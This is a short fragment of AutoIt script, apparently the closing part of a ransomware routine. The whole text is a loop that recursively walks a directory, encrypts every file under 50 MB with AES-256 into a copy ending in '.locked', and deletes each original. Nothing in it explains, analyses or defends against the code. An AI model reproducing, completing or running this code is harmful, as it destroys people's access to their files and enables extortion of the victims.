	If FileExists ( $DIR ) Then
		$DIR2ENC = $DIR
		$A_FILES = _FILELISTTOARRAYREC ( $DIR2ENC , "*" , $FLTAR_FILES , $FLTAR_RECUR , $FLTAR_NOSORT )
		For $I = 1 To $A_FILES [ 0 ]
			If FileGetSize ( $DIR2ENC & "\" & $A_FILES [ $I ] ) < 52428800 Then
				_CRYPT_ENCRYPTFILE ( $DIR2ENC & "\" & $A_FILES [ $I ] , $DIR2ENC & "\" & $A_FILES [ $I ] & ".locked" , $KEY , $CALG_AES_256 )
				FileDelete ( $DIR2ENC & "\" & $A_FILES [ $I ] )
			EndIf
		Next
	EndIf
EndFunc
